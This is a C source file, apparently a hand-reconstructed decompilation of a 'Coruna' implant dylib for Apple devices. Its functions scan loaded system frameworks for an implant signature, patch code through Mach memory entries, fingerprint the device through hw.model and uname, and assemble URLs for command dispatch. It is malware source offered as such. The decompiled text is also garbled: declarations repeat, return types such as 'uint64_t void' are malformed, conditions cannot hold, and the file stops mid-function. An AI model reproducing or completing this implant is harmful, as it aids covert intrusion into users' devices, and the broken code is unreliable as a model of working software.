/*
 * Coruna implant dylib (6850 variant) — pattern-scan + dispatch helper
 *
 * Mach-O export _start: scans mapped memory for implant signatures, builds
 * context, and dispatches rwlock-protected command tables (6850 layout).
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Runtime constants (from Mach-O image) */
static uint64_t k_implant_pattern_sig = 0x52800006aa1303e5ULL;
static uint64_t k_implant_scan_magic = 0x000a000100000002ULL;
static uint64_t k_implant_icache_mode;
static uint64_t k_implant_md5_init_state = 0x3320646e61707865ULL;
static uint64_t k_implant_dsb_ctrl_a;
static uint64_t k_implant_dsb_ctrl_b;
static void *k_implant_stack_chk_guard_slot = (void *)0x8010000000000002ULL;
static void *k_implant_mach_task_self_slot = (void *)0x8010000000000010ULL;
static void *k_implant_vm_page_mask_slot = (void *)0x8010000000000029ULL;
static void *k_implant_vm_page_size_slot = (void *)0x800000000000002aULL;


uint64_t
void coruna_implant6850_str_system_library_frameworks_quartzcore_framework_q(long handle,long addr_2,void *ctx,unsigned long arg,uint64_t val,uint size)
{
  uint64_t *ptr;
  long handle;
  uint u;
  uint size;
  void *ptr;
  uint *buf;
  uint64_t version;
  unsigned long port;
  void *buf;
  size_t ls10;
  unsigned long tag;
  unsigned long kind;
  uint64_t type_id;
  uint *str;
  void *str;
  uint *copy;
  uint type_id_8;
  long addr;
  uint *data;
  long off;
  void *scratch;
  uint bootargs;
  void *thread_attr;
  uint64_t host_info;
  long serial_buf;
  void *action;
  unsigned long block_ctx;
  long stack_guard;
  unsigned long sa_saved;
  void *sa_new;
  unsigned long path_buf;
  uint *tmp_buf;
  uint64_t region;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long plist;
  
  plist = *(long *)k_implant_stack_chk_guard_slot;
  tmp_buf = (uint *)0x0;
  sa_new = (void *)0x0;
  path_buf = 0;
  stack_guard = 0;
  sa_saved = 0;
  action = (void *)0x0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = (void *)0x0;
  type_id = 0xad001;
  bootargs = 0;
  version = type_id;
  if (handle == 0) goto fail;
  scratch = (void *)0x0;
  scratch = 0;
  region = 0;
  thread_attr = 0;
  bootargs = 0;
  version = (**(void (**)(addr_2 + 0x20))(addr_2,&thread_attr,&bootargs);
  if (((int)version == 0) &&
     (version = coruna_compression_encode_buffer(&thread_attr,&bootargs), u = bootargs, (int)version == 0)) {
    _memset_s(thread_attr,bootargs,0,bootargs);
    _free(thread_attr);
    thread_attr = (void *)0x0;
    bootargs = 0;
    version = coruna_dladdr("/System/Library/Frameworks/QuartzCore.framework/QuartzCore",
                         "CACurrentMediaTime","__unwind_info",&scratch,&tmp_buf,&path_buf);
    if ((int)version != 0) goto done;
    port = coruna_implant_lookup_entry(handle,arg);
    if (path_buf < port) {
cleanup:
      str = (uint *)0x0;
check_ok:
      copy = (uint *)0x0;
skip:
      version = 0xad009;
      data = (uint *)0x0;
      goto next;
    }
    version = coruna_dladdr("/System/Library/PrivateFrameworks/AppleCV3D.framework/AppleCV3D",
                         "CV3DGetVersionInfo","__text",0,&stack_guard,&block_ctx);
    buf = tmp_buf;
    if ((int)version != 0) goto done;
    kind = (unsigned long)(u + 0x40000 + size);
    if (block_ctx < kind) goto cleanup;
    str = (uint *)0x0;
    handle = stack_guard + (block_ctx - kind);
    block_ctx = kind;
    stack_guard = handle;
    if (scratch == (void *)0x0) {
      copy = (uint *)0x0;
      data = (uint *)0x0;
      version = type_id;
      goto next;
    }
    version = type_id;
    copy = str;
    data = str;
    if (tmp_buf == (uint *)0x0) goto next;
    buf = _memmem(scratch,0x100000,&k_implant_pattern_sig,8);
    if (buf == (void *)0x0) {
      str = (uint *)0x0;
      data = (uint *)0x0;
      copy = (uint *)0x0;
      version = 0xad011;
      goto next;
    }
    str = (uint *)((long)buf + 8);
    type_id_8 = *str;
    if (type_id_8 >> 0x1a != 0x25) {
retry:
      str = (uint *)0x0;
      copy = (uint *)0x0;
      data = (uint *)0x0;
      version = 0xad014;
      goto next;
    }
    off = (long)str - (long)buf;
    if (str < buf || off == 0) {
      tag = (long)buf - (long)str >> 2;
      if (tag >> 0x19 != 0) goto retry;
    }
    else {
      if ((unsigned long)(off >> 2) >> 0x19 != 0) goto retry;
      tag = (unsigned long)((uint)((int)buf - (int)str) >> 2);
    }
    host_info = coruna_u64_pack(((int)tag), (type_id_8)) & 0x3ffffffffffffff | 0x9400000000000000;
    version = coruna_implant_dup_buffer(buf,port,&sa_new,&sa_saved);
    if ((((((int)version != 0) ||
          (version = coruna_implant_dup_buffer(handle,kind,&action,&serial_buf), (int)version != 0)) ||
         (version = coruna_implant_dispatch_wrlocked(addr_2,0xa0003,sa_new,sa_saved & 0xffffffff), str = action,
         addr = serial_buf, (int)version != 0)) ||
        ((version = coruna_implant_dispatch_wrlocked(addr_2,0xa0004), (int)version != 0 ||
         (version = (**(void (**)(addr_2 + 0x20))(addr_2,&thread_attr,&bootargs), (int)version != 0)))) ||
       (version = coruna_compression_encode_buffer(&thread_attr,&bootargs), ptr = thread_attr, size = bootargs,
       (int)version != 0)) goto found;
    if (u + 0x40000 < bootargs) goto check_ok;
    copy = (uint *)0x0;
    if ((thread_attr == (void *)0x0) || (bootargs == 0)) {
      data = (uint *)0x0;
      version = type_id;
      goto next;
    }
    _arc4random_buf(&region,0x20);
    coruna_implant_md5_xor_loop(&region,ptr,size);
    port = (unsigned long)bootargs;
    data = (uint *)coruna_implant_lookup_entry(handle,arg);
    copy = _malloc((size_t)data);
    if (copy == (uint *)0x0) goto skip;
    _bzero(copy,(size_t)data);
    kind = arg & 0xffffffff;
    _memcpy(copy,ctx,kind);
    copy[4] = 0;
    copy[5] = 0;
    copy[2] = 0;
    copy[3] = 0;
    copy[8] = 0;
    copy[9] = 0;
    copy[6] = 0;
    copy[7] = 0;
    tag = (unsigned long)size;
    copy[0xc] = 0;
    copy[0xd] = 0;
    copy[10] = 0;
    copy[0xb] = 0;
    copy[0x18] = 0;
    copy[0x19] = 0;
    copy[0x16] = 0;
    copy[0x17] = 0;
    copy[0x1c] = 0;
    copy[0x1d] = 0;
    copy[0x1a] = 0;
    copy[0x1b] = 0;
    copy[0x20] = 0;
    copy[0x21] = 0;
    copy[0x1e] = 0;
    copy[0x1f] = 0;
    copy[0x2e] = 0;
    copy[0x2f] = 0;
    copy[0x2c] = 0;
    copy[0x2d] = 0;
    copy[0x2a] = 0;
    copy[0x2b] = 0;
    copy[0x28] = 0;
    copy[0x29] = 0;
    copy[0x26] = 0;
    copy[0x27] = 0;
    copy[0x24] = 0;
    copy[0x25] = 0;
    copy[0x22] = 0;
    copy[0x23] = 0;
    copy[0x14] = 0;
    copy[0x15] = 0;
    copy[0x12] = 0;
    copy[0x13] = 0;
    copy[0x10] = 0;
    copy[0x11] = 0;
    copy[0xe] = 0;
    copy[0xf] = 0;
    *(unsigned long *)(copy + 2) =
         (long)str + (((unsigned long)(type_id_8 << 2) & 0x7fffffc) - (long)buf) + -0xc;
    copy[4] = 0;
    copy[5] = 0;
    *(uint **)(copy + 6) = data;
    *(long *)(copy + 8) = handle - (long)buf;
    *(unsigned long *)(copy + 10) = tag;
    *(long *)(copy + 0x18) = off;
    *(unsigned long *)(copy + 0x1a) = (unsigned long)type_id_8;
    *(unsigned long *)(copy + 0x1c) = (handle - (long)buf) + (unsigned long)size;
    *(unsigned long *)(copy + 0x1e) = port;
    ptr = (uint64_t *)((long)copy + (arg & 0xffffffff));
    ptr[1] = scratch;
    *ptr = region;
    ptr[3] = thread_attr;
    ptr[2] = bootargs;
    *(unsigned long *)(copy + 0xe) = kind;
    off = kind + 0x20;
    if (*(char **)(handle + 0x80) != (char *)0x0) {
      _strcpy((char *)((long)copy + off),*(char **)(handle + 0x80));
      *(long *)(copy + 0xc) = off;
      ls10 = _strlen(*(char **)(handle + 0x80));
      off = kind + ls10 + 0x21;
    }
    if (*(char **)(handle + 0x78) != (char *)0x0) {
      _strcpy((char *)((long)copy + off),*(char **)(handle + 0x78));
      *(long *)(copy + 0x10) = off;
      ls10 = _strlen(*(char **)(handle + 0x78));
      off = off + ls10 + 1;
    }
    if (*(char **)(handle + 0xa0) != (char *)0x0) {
      _strcpy((char *)((long)copy + off),*(char **)(handle + 0xa0));
      *(long *)(copy + 0x14) = off;
      ls10 = _strlen(*(char **)(handle + 0xa0));
      off = off + ls10 + 1;
    }
    if (*(char **)(handle + 0xa8) != (char *)0x0) {
      _strcpy((char *)((long)copy + off),*(char **)(handle + 0xa8));
      *(long *)(copy + 0x16) = off;
    }
    version = coruna_mach_make_memory_entry_64(handle,val,tag);
    if ((((int)version != 0) ||
        (version = coruna_mach_make_memory_entry_64(handle + tag,thread_attr,bootargs), (int)version != 0)) ||
       (version = coruna_mach_make_memory_entry_64(buf,copy,data), (int)version != 0)) goto next;
    version = coruna_mach_make_memory_entry_64(str,(long)&host_info + 4,4);
    if ((int)version != 0) goto nomem;
  }
  else {
done:
    str = (uint *)0x0;
found:
    copy = (uint *)0x0;
    data = (uint *)0x0;
next:
    type_id_8 = (uint)host_info;
nomem:
    if ((str != (uint *)0x0) && (type_id_8 != 0)) {
      coruna_mach_make_memory_entry_64(str,&host_info,4);
    }
    if (((tmp_buf != (uint *)0x0) && (sa_new != (void *)0x0)) && (sa_saved != 0)) {
      coruna_mach_make_memory_entry_64();
    }
    str = action;
    addr = serial_buf;
    if (((stack_guard != 0) && (action != (void *)0x0)) && (serial_buf != 0)) {
      coruna_mach_make_memory_entry_64(stack_guard,action,serial_buf);
    }
  }
  if ((thread_attr != (void *)0x0) && (bootargs != 0)) {
    _memset_s(thread_attr,bootargs,0,bootargs);
    _free(thread_attr);
  }
  if ((data != (uint *)0x0) && (copy != (uint *)0x0)) {
    _memset_s(copy,data,0,data);
    _free(copy);
    str = action;
    addr = serial_buf;
  }
  if ((str != (void *)0x0) && (addr != 0)) {
    _memset_s(str,addr,0,addr);
    _free(str);
  }
  buf = sa_new;
  if ((sa_new != (void *)0x0) && (sa_saved != 0)) {
    _memset_s(sa_new,sa_saved,0,sa_saved);
    _free(buf);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != plist) {
    ___stack_chk_fail();
  }
  return version;
}





uint64_t
void coruna_dladdr(uint64_t val,uint64_t id_2,char *path,unsigned long *arg,uint64_t *size_3,
            unsigned long *arg)
{
  int err;
  long handle;
  unsigned long u;
  uint8_t *ptr;
  uint64_t size;
  uint64_t scratch;
  mach_header_64 *bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  
  size = 0x1a002;
  handle = _dlopen(val,2);
  if (handle != 0) {
    u = _dlsym(handle,id_2);
    if (u == 0) {
      size = 0x1a003;
    }
    else {
      bootargs = (mach_header_64 *)0x0;
      scratch = 0;
      bootargs = 0;
      scratch = 0;
      err = _dladdr(u,&scratch);
      if (err == 0) {
        size = 0x1a004;
      }
      else {
        ptr = _getsectiondata(bootargs,"__TEXT",path,&thread_attr);
        if (ptr == (uint8_t *)0x0) {
          size = 0x1c001;
        }
        else {
          *arg = thread_attr;
          *size_3 = ptr;
          size = 0;
          if (arg != (unsigned long *)0x0) {
            *arg = u & 0x7fffffffff;
          }
        }
      }
    }
    _dlclose(handle);
  }
  return size;
}





unsigned long coruna_implant_lookup_entry(long arg,int val)

{
  size_t ls1;
  unsigned long u;
  
  u = (unsigned long)(val + 0x20);
  if (*(char **)(arg + 0x80) != (char *)0x0) {
    ls1 = _strlen(*(char **)(arg + 0x80));
    u = u + ls1 + 1;
  }
  if (*(char **)(arg + 0x78) != (char *)0x0) {
    ls1 = _strlen(*(char **)(arg + 0x78));
    u = u + ls1 + 1;
  }
  if (*(char **)(arg + 0xa0) != (char *)0x0) {
    ls1 = _strlen(*(char **)(arg + 0xa0));
    u = u + ls1 + 1;
  }
  if (*(char **)(arg + 0xa8) != (char *)0x0) {
    ls1 = _strlen(*(char **)(arg + 0xa8));
    u = u + ls1 + 1;
  }
  return u;
}





uint64_t coruna_implant_dup_buffer(void *ctx,size_t len,uint64_t *val,size_t *size_2)
{
  void *ptr;
  uint64_t u;
  
  u = 0xad001;
  if ((ctx != (void *)0x0) && (len != 0)) {
    ptr = _malloc(len);
    if (ptr == (void *)0x0) {
      u = 0xad009;
    }
    else {
      _memcpy(ptr,ctx,len);
      u = 0;
      *val = ptr;
      *size_2 = len;
    }
  }
  return u;
}





void coruna_implant6850_str_hw_model(long handle)
{
  uint u;
  bool err;
  int err;
  int status;
  size_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  err = false;
  if (handle == 0) goto fail;
  u = *(uint *)(handle + 0xc0);
  if (u < 0x100700) {
    if (0x100400 < u) {
      err = *(int *)(handle + 0xe0);
      err = true;
      if (err < 0x1b588bb3) {
        if (err != -0x789a1216) {
          status = -0x25cc27c3;
done:
          if (err != status) goto fail;
        }
      }
      else if (err != 0x1b588bb3) {
        status = 0x462504d2;
        goto done;
      }
cleanup:
      err = false;
      goto fail;
    }
    if (0xf8f8 < u - 0xf0707) {
      if (u - 0xf0200 >> 9 < 0x7f) {
        scratch = 0;
        bootargs = 0;
        thread_attr = 0;
        bootargs = 0;
        scratch = 0x20;
        err = _sysctlbyname("hw.model",&bootargs,&scratch,(void *)0x0,0);
        if ((err == 0) && (((byte)bootargs & 0xdf) == 0x4a)) {
          err = *(long *)(handle + 0x640) - 0x40000001U >> 0x1e == 0;
          goto fail;
        }
      }
      goto cleanup;
    }
  }
  err = true;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(err);
}





void coruna_uname(long handle,long addr_2,uint64_t val,long off_3,long ctx_4,
                 long ctx_5)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  int err;
  uint64_t kind;
  uint type_id;
  uint type_id_8;
  uint type_id_9;
  utsname scratch;
  long scratch;
  
  scratch = *(long *)k_implant_stack_chk_guard_slot;
  kind = 0xad001;
  if (((((handle != 0) && (addr_2 != 0)) && ((int)val != 0)) &&
      ((off_3 != 0 && (ctx_4 != 0)))) && (ctx_5 != 0)) {
    tag = coruna_implant_probe_hw_model(handle);
    if (tag == 0) {
      type_id = 0;
      goto fail;
    }
    version = *(uint *)(handle + 0xdc);
    type_id = *(uint *)(handle + 0xc0);
    if (type_id < 0xf0600) {
      if (type_id < 0xf0000) {
        if (0xe0801 < type_id) goto done;
        if (type_id < 0xd0000) {
          type_id = 0;
          tag = 0;
        }
        else {
          type_id_8 = type_id >> 8 & 0xf00;
          u = type_id >> 4 & 0xf0;
          type_id_9 = 0;
          if (0x4f < u) {
            type_id_9 = 0x50;
          }
          port = 0x70;
          if (u < 0x70) {
            port = type_id_9;
          }
          type_id_9 = 0x70;
          if ((type_id & 0xf) != 0) {
            type_id_9 = u;
          }
          size = 0;
          if (0x7f < u) {
            size = type_id & 0xf;
            port = type_id_9;
          }
          u = 0;
          if (0xdff < type_id_8) {
            u = port;
          }
          type_id = 0;
          if (0xdff < type_id_8) {
            type_id = size;
          }
          type_id_9 = 0x11000000;
          if (version < 2) {
            type_id_9 = 0x10000000;
          }
          type_id = type_id_8 | type_id_9 | u | type_id;
        }
      }
      else {
        _bzero(&scratch,0x500);
        err = _uname(&scratch);
        if ((err != 0) ||
           (scratch.machine != 0x6f685069 || scratch.machine != 0x656e))
        goto done;
        type_id_8 = 0x13000000;
        if (version < 2) {
          type_id_8 = 0x12000000;
        }
        type_id = type_id >> 8 & 0xf00 | type_id_8 | (uint)((type_id & 0xe00) != 0) << 5;
      }
    }
    else {
done:
      type_id = 0xe2000000;
      if (version < 2) {
        type_id = 0x2000000;
      }
    }
fail:
    kind = coruna_snprintf(handle,tag | type_id,addr_2,val,off_3,ctx_4,ctx_5);
    if ((int)kind == 0x30001) {
      kind = coruna_implant_probe_hw_model(handle);
      if ((uint)kind == 0) {
        tag = 0;
      }
      else if ((*(byte *)(handle + 0xdb) & 1) == 0) {
        tag = 0x1000000;
      }
      else {
        tag = 0xe2000000;
        if (*(uint *)(handle + 0xdc) < 2) {
          tag = 0x2000000;
        }
      }
      if (*(long *)k_implant_stack_chk_guard_slot == scratch) {
        coruna_snprintf(handle,tag | (uint)kind,addr_2,val,off_3,ctx_4,ctx_5);
        return;
      }
      goto cleanup;
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == scratch) {
    return;
  }
cleanup:
  ___stack_chk_fail(kind);
}





void coruna_snprintf(long handle,int flags,int *count_2,uint size,char *path,unsigned long arg,
                 long *addr_2)
{
  size_t ls1;
  char err;
  uint u;
  int err;
  size_t ls5;
  char *ptr;
  char *buf;
  unsigned long size;
  uint64_t *ptr;
  char *str;
  char *copy;
  long handle;
  char *data;
  int *err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t action;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t block_ctx;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t stack_guard;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t sa_saved;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t sa_new;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t path_buf;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t tmp_buf;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t region;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t plist;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t url_buf;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t json_buf;
  uint64_t cache_46;
  uint64_t cache_47;
  uint64_t cache_48;
  long frame;
  
  frame = *(long *)k_implant_stack_chk_guard_slot;
  if ((((((handle == 0) || (count_2 == (int *)0x0)) || (size < 0x10c)) ||
       ((*count_2 != 0x12345678 || ((char)count_2[2] == '\0')))) ||
      ((*(char *)((long)count_2 + 0x107) != '\0' ||
       ((count_2[0x42] == 0 || (path == (char *)0x0)))))) ||
     ((arg == 0 || (addr_2 == (long *)0x0)))) {
    u = 0xd001;
fail:
    u = u | 0xa0000;
  }
  else {
    u = 0x30001;
    if (flags != 0) {
      size = 0;
      err = count_2 + 0x43;
      while( true ) {
        if (((((int *)((long)count_2 + (unsigned long)size) <= err) || (err + 0x19 < count_2)) ||
            ((int *)((long)count_2 + (unsigned long)size) < err + 0x19)) ||
           (*(char *)((long)err + 99) != '\0')) {
          u = 0xd014;
          goto fail;
        }
        if (*err == flags) break;
        size = size + 1;
        err = err + 0x19;
        if ((uint)count_2[0x42] <= size) goto done;
      }
      cache_46 = 0;
      json_buf = 0;
      cache_48 = 0;
      cache_47 = 0;
      cache_43 = 0;
      url_buf = 0;
      cache_45 = 0;
      cache_44 = 0;
      cache_40 = 0;
      plist = 0;
      cache_42 = 0;
      cache_41 = 0;
      cache_37 = 0;
      region = 0;
      cache_39 = 0;
      cache_38 = 0;
      cache_34 = 0;
      tmp_buf = 0;
      cache_36 = 0;
      cache_35 = 0;
      cache_31 = 0;
      path_buf = 0;
      cache_33 = 0;
      cache_32 = 0;
      cache_28 = 0;
      sa_new = 0;
      cache_30 = 0;
      cache_29 = 0;
      cache_25 = 0;
      sa_saved = 0;
      cache_27 = 0;
      cache_26 = 0;
      cache_22 = 0;
      stack_guard = 0;
      cache_24 = 0;
      cache_23 = 0;
      cache = 0;
      block_ctx = 0;
      cache_21 = 0;
      cache_20 = 0;
      json_buf = 0;
      action = 0;
      work = 0;
      frame = 0;
      region = 0;
      serial_buf = 0;
      url_buf = 0;
      plist = 0;
      sa_new = 0;
      host_info = 0;
      tmp_buf = 0;
      path_buf = 0;
      block_ctx = 0;
      thread_attr = 0;
      sa_saved = 0;
      stack_guard = 0;
      host_info = 0;
      bootargs = 0;
      action = 0;
      serial_buf = 0;
      scratch = 0;
      scratch = 0;
      thread_attr = 0;
      bootargs = 0;
      ls5 = _strlen((char *)(count_2 + 2));
      copy = "%s%s";
      if (*(char *)((long)count_2 + ls5 + 7) != '/') {
        copy = "%s/%s";
      }
      err = _snprintf((char *)&scratch,0x200,copy);
      if (0x1ff < err) {
        u = 0xad00c;
        goto done;
      }
      err = (char)scratch;
      u = 0xad001;
      if ((char)scratch == '\0') goto done;
      err = (int)scratch;
      if ((err == 0x70747468 && scratch == 0x2f2f3a70) ||
         (scratch == 0x2f2f3a7370747468)) {
        _strlcpy(path,(char *)&scratch,arg);
        goto cleanup;
      }
      copy = *(char **)(handle + 0x80);
      u = 0x30003;
      if ((copy == (char *)0x0) || (*copy == '\0')) goto done;
      handle = 8;
      err = _strncmp(copy,"https://",8);
      if (err != 0) {
        handle = 7;
        err = _strncmp(copy,"http://",7);
        if (err != 0) {
          u = 0x30004;
          goto done;
        }
      }
      ptr = _strchr(copy + handle,0x2f);
      if (ptr == (char *)0x0) {
        ls5 = _strlen(copy);
        goto check_ok;
      }
      data = ptr + 1;
      if (err == '/') {
        ptr = &scratch;
        ls5 = (long)(ptr + 1) - (long)copy;
      }
      else {
        do {
          str = data;
          buf = _strchr(str,0x2f);
          data = buf + 1;
        } while (buf != (char *)0x0);
        ls5 = (long)str - (long)copy;
check_ok:
        ptr = &scratch;
        if (err == '.') {
          ptr = (uint64_t *)((unsigned long)&scratch | (unsigned long)(scratch == '/') << 1);
        }
      }
      data = (char *)((long)ptr + -1);
      do {
        data = data + 1;
      } while (*data == '/');
      ls1 = arg;
      if (ls5 + 1 <= arg) {
        ls1 = ls5 + 1;
      }
      _strlcpy(path,copy,ls1);
      if (ptr == (char *)0x0) {
        _strlcat(path,"/",arg);
      }
      _strlcat(path,data,arg);
cleanup:
      u = 0;
      *addr_2 = (long)(err + 1);
    }
  }
done:
  if (*(long *)k_implant_stack_chk_guard_slot != frame) {
    ___stack_chk_fail(u);
  }
  return;
}





uint64_t
void coruna_implant_format_dispatch(long handle,long addr_2,uint64_t val,long off_3,long ctx_4,long ctx_5)
{
  int err;
  uint u;
  unsigned long size;
  uint64_t version;
  uint port;
  uint tag;
  int status;
  
  if (((((handle == 0) || (addr_2 == 0)) || ((int)val == 0)) ||
      ((off_3 == 0 || (ctx_4 == 0)))) || (ctx_5 == 0)) {
    return 0xad001;
  }
  if ((*(char *)(handle + 0x5e8) == '\0') || (size = coruna_implant6850_str_hw_model(handle), (size & 1) != 0)) {
    port = 0;
    goto fail;
  }
  if (*(int *)(handle + 0xc0) - 0x100400U >> 10 < 0x3f) {
    err = *(int *)(handle + 0xe0);
    port = 0x30000;
    if (err < 0x1b588bb3) {
      if (err == -0x789a1216) goto fail;
      status = -0x25cc27c3;
    }
    else {
      if (err == 0x1b588bb3) goto fail;
      status = 0x462504d2;
    }
    if (err == status) goto fail;
  }
  port = 0x50000;
  if (0x400 < *(int *)(handle + 0xc0) - 0x100000U) {
    port = 0;
  }
fail:
  u = coruna_implant_probe_hw_model(handle);
  if (u == 0) {
    tag = 0;
  }
  else if ((*(byte *)(handle + 0xdb) & 1) == 0) {
    tag = 0xf1000000;
  }
  else {
    tag = 0xf3000000;
    if (*(uint *)(handle + 0xdc) < 2) {
      tag = 0xf2000000;
    }
  }
  version = coruna_snprintf(handle,u | port | tag,addr_2,val,off_3,ctx_4,ctx_5);
  return version;
}





unsigned long coruna_strdup(long arg,uint64_t val,uint64_t *n,uint *m)

{
  int err;
  char err;
  int status;
  long handle;
  uint size;
  char *ptr;
  size_t ls7;
  uint version;
  int flags;
  void (*buf)(void);
  char *str;
  unsigned long port;
  int scratch;
  long bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  uint serial_buf;
  void *action;
  uint64_t block_ctx;
  char stack_guard [520];
  long sa_saved;
  
  sa_saved = *(long *)k_implant_stack_chk_guard_slot;
  port = 0xad001;
  if ((arg == 0) ||
     (((*(void (**)(arg + 0x110) == (void (*)0x0 || (int)val == 0) ||
      n == (uint64_t *)0x0) || m == (uint *)0x0)) goto fail;
  bootargs = 0;
  scratch = 0;
  port = (**(void (**)(arg + 0x110))(arg,val,&bootargs,&scratch);
  handle = bootargs;
  status = scratch;
  if ((int)port != 0) goto fail;
  if ((bootargs != 0) && (scratch != 0)) {
    if (*(char *)(arg + 0x5e8) != '\0') {
      port = 0xad001;
      if (*(long *)(arg + 0xe8) == 0) goto fail;
      stack_guard[0x1e8] = '\0';
      stack_guard[0x1e9] = '\0';
      stack_guard[0x1ea] = '\0';
      stack_guard[0x1eb] = '\0';
      stack_guard[0x1ec] = '\0';
      stack_guard[0x1ed] = '\0';
      stack_guard[0x1ee] = '\0';
      stack_guard[0x1ef] = '\0';
      stack_guard[0x1e0] = '\0';
      stack_guard[0x1e1] = '\0';
      stack_guard[0x1e2] = '\0';
      stack_guard[0x1e3] = '\0';
      stack_guard[0x1e4] = '\0';
      stack_guard[0x1e5] = '\0';
      stack_guard[0x1e6] = '\0';
      stack_guard[0x1e7] = '\0';
      stack_guard[0x1f8] = '\0';
      stack_guard[0x1f9] = '\0';
      stack_guard[0x1fa] = '\0';
      stack_guard[0x1fb] = '\0';
      stack_guard[0x1fc] = '\0';
      stack_guard[0x1fd] = '\0';
      stack_guard[0x1fe] = '\0';
      stack_guard[0x1ff] = '\0';
      stack_guard[0x1f0] = '\0';
      stack_guard[0x1f1] = '\0';
      stack_guard[0x1f2] = '\0';
      stack_guard[499] = '\0';
      stack_guard[500] = '\0';
      stack_guard[0x1f5] = '\0';
      stack_guard[0x1f6] = '\0';
      stack_guard[0x1f7] = '\0';
      stack_guard[0x1c8] = '\0';
      stack_guard[0x1c9] = '\0';
      stack_guard[0x1ca] = '\0';
      stack_guard[0x1cb] = '\0';
      stack_guard[0x1cc] = '\0';
      stack_guard[0x1cd] = '\0';
      stack_guard[0x1ce] = '\0';
      stack_guard[0x1cf] = '\0';
      stack_guard[0x1c0] = '\0';
      stack_guard[0x1c1] = '\0';
      stack_guard[0x1c2] = '\0';
      stack_guard[0x1c3] = '\0';
      stack_guard[0x1c4] = '\0';
      stack_guard[0x1c5] = '\0';
      stack_guard[0x1c6] = '\0';
      stack_guard[0x1c7] = '\0';
      stack_guard[0x1d8] = '\0';
      stack_guard[0x1d9] = '\0';
      stack_guard[0x1da] = '\0';
      stack_guard[0x1db] = '\0';
      stack_guard[0x1dc] = '\0';
      stack_guard[0x1dd] = '\0';
      stack_guard[0x1de] = '\0';
      stack_guard[0x1df] = '\0';
      stack_guard[0x1d0] = '\0';
      stack_guard[0x1d1] = '\0';
      stack_guard[0x1d2] = '\0';
      stack_guard[0x1d3] = '\0';
      stack_guard[0x1d4] = '\0';
      stack_guard[0x1d5] = '\0';
      stack_guard[0x1d6] = '\0';
      stack_guard[0x1d7] = '\0';
      stack_guard[0x1a8] = '\0';
      stack_guard[0x1a9] = '\0';
      stack_guard[0x1aa] = '\0';
      stack_guard[0x1ab] = '\0';
      stack_guard[0x1ac] = '\0';
      stack_guard[0x1ad] = '\0';
      stack_guard[0x1ae] = '\0';
      stack_guard[0x1af] = '\0';
      stack_guard[0x1a0] = '\0';
      stack_guard[0x1a1] = '\0';
      stack_guard[0x1a2] = '\0';
      stack_guard[0x1a3] = '\0';
      stack_guard[0x1a4] = '\0';
      stack_guard[0x1a5] = '\0';
      stack_guard[0x1a6] = '\0';
      stack_guard[0x1a7] = '\0';
      stack_guard[0x1b8] = '\0';
      stack_guard[0x1b9] = '\0';
      stack_guard[0x1ba] = '\0';
      stack_guard[0x1bb] = '\0';
      stack_guard[0x1bc] = '\0';
      stack_guard[0x1bd] = '\0';
      stack_guard[0x1be] = '\0';
      stack_guard[0x1bf] = '\0';
      stack_guard[0x1b0] = '\0';
      stack_guard[0x1b1] = '\0';
      stack_guard[0x1b2] = '\0';
      stack_guard[0x1b3] = '\0';
      stack_guard[0x1b4] = '\0';
      stack_guard[0x1b5] = '\0';
      stack_guard[0x1b6] = '\0';
      stack_guard[0x1b7] = '\0';
      stack_guard[0x188] = '\0';
      stack_guard[0x189] = '\0';
      stack_guard[0x18a] = '\0';
      stack_guard[0x18b] = '\0';
      stack_guard[0x18c] = '\0';
      stack_guard[0x18d] = '\0';
      stack_guard[0x18e] = '\0';
      stack_guard[399] = '\0';
